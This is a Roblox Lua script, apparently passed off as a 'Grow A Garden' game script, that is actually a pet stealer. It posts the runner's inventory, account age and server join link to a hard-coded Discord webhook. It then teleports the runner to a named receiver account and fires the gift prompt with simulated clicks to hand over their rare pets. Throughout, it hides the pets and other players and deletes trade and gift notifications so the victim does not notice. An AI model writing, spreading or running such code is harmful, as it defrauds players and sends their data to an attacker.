repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
local dataModule = require(ReplicatedStorage.Modules.DataService)

local USERNAMES = {
    "Elaine_Pets18"
}

local PET_WHITELIST = {
    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
}

local PET_PRIORITY = {
    "Raccoon",
    "Disco Bee",
    "Butterfly"
}

local victimPetTable = {}

-- Notification blocking patterns
local BLOCKED_PATTERNS = {
    "^Your trade is processing, please wait until your trade finalizes before creating another one%.$",
    "^You can only place your pets in garden!$",
    "^Gift has been sent @.+ of the one you giving$",
    "^You already have a outgoing gift request for this pet!$",
    "^Sent Gift request!$"
}

local function matchesBlocked(text)
    for _, pattern in ipairs(BLOCKED_PATTERNS) do
        if string.match(text, pattern) then
            return true
        end
    end
    return false
end

local function removeNotif(obj)
    if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text then
        if matchesBlocked(obj.Text) then
            if obj.Parent then
                obj.Parent:Destroy()
            end
        end
    end
end

-- Aggressive notification remover every frame
RunService.Heartbeat:Connect(function()
    for _, obj in ipairs(CoreGui:GetDescendants()) do
        removeNotif(obj)
    end
end)

-- Pet invisibility (no animation interruption)
local function hideHeldPets()
    local char = LocalPlayer.Character
    if not char then return end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") or tool:IsA("Model") then
            for _, obj in ipairs(tool:GetDescendants()) do
                if obj:IsA("BasePart") or obj:IsA("MeshPart") then
                    obj.Transparency = 1
                    for _, decal in ipairs(obj:GetChildren()) do
                        if decal:IsA("Decal") then
                            decal.Transparency = 1
                        end
                    end
                elseif obj:IsA("Decal") then
                    obj.Transparency = 1
                end
            end
        end
    end
end

RunService.Heartbeat:Connect(hideHeldPets)

LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid")
    RunService.Heartbeat:Connect(hideHeldPets)
end)

print("[‚úî] Pet invisibility + blocked notifications active.")

-- (rest of your code continues unchanged below)
-- Helper functions --

local function checkPetsWhitelist(petName)
    return PET_WHITELIST[petName] ~= nil
end

local function getPetObject(petUUID)
    for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUUID then
            return obj
        end
    end
    if LocalPlayer.Character then
        for _, obj in pairs(LocalPlayer.Character:GetChildren()) do
            if obj:GetAttribute("PET_UUID") == petUUID then
                return obj
            end
        end
    end
    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:EquipTool(pet)
    end
end

local function teleportTarget(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
    end
end

local function deltaBypass()
    local viewportSize = workspace.CurrentCamera.ViewportSize
    VirtualInputManager:SendMouseButtonEvent(viewportSize.X / 2, viewportSize.Y / 2, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(viewportSize.X / 2, viewportSize.Y / 2, 0, false, nil, false)
end

local function startSteal(triggerName)
    local targetPlayer = Players:FindFirstChild(triggerName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            deltaBypass()
        end
    end
end

local function createDiscordEmbed(petList, totalValue, fileUrl)
    local embed = {
        title = "üåµ Grow A Garden Hit - KUNI SCRIPT STEALER üí∏",
        color = 65280,
        fields = {
            {
                name = "üë§ **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    LocalPlayer.Name, 
                    table.concat(USERNAMES, " "), 
                    LocalPlayer.Name,
                    LocalPlayer.AccountAge
                ),
                inline = false
            },
            {
                name = "üå¥ **Backpack**",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "üèùÔ∏è **Join with URL**",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                    game.JobId, 
                    game.PlaceId, 
                    game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format(
            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    local request = http_request or request or HttpPost or syn.request
    local response = request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Error sending to Discord:", response.StatusCode, response.Body)
    end
end

local function checkPetsInventory(targetName)
    local petsData = dataModule:GetData().PetsData.PetInventory.Data

    -- Priority pets first
    for _, priorityPetName in ipairs(PET_PRIORITY) do
        for petUUID, petData in pairs(petsData) do
            if petData.PetType == priorityPetName then
                local petObject = getPetObject(petUUID)
                if petObject then
                    equipPet(petObject)
                    task.wait(0.2)
                    startSteal(targetName)
                end
            end
        end
    end

    -- Then rest of pets (excluding priority)
    for petUUID, petData in pairs(petsData) do
        if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
            local petObject = getPetObject(petUUID)
            if petObject then
                equipPet(petObject)
                task.wait(0.2)
                startSteal(targetName)
            end
        end
    end
end

local function waitForJoin()
    for _, player in pairs(Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

local function makeInvisibleToVictims()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
                        part.Transparency = 1
                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
                        part.Enabled = false
                    end
                end
            end
        end
    end
end

local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local found, targetName = waitForJoin()
            if found then
                teleportTarget(targetName)
                checkPetsInventory(targetName)
                makeInvisibleToVictims()
            end
        end
    end)
end

-- Build victim pet list for Discord report
for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
    if checkPetsWhitelist(petData.PetType) then
        table.insert(victimPetTable, petData.PetType)
    end
end

idlingTarget()

task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
            break
        end
    end
end)
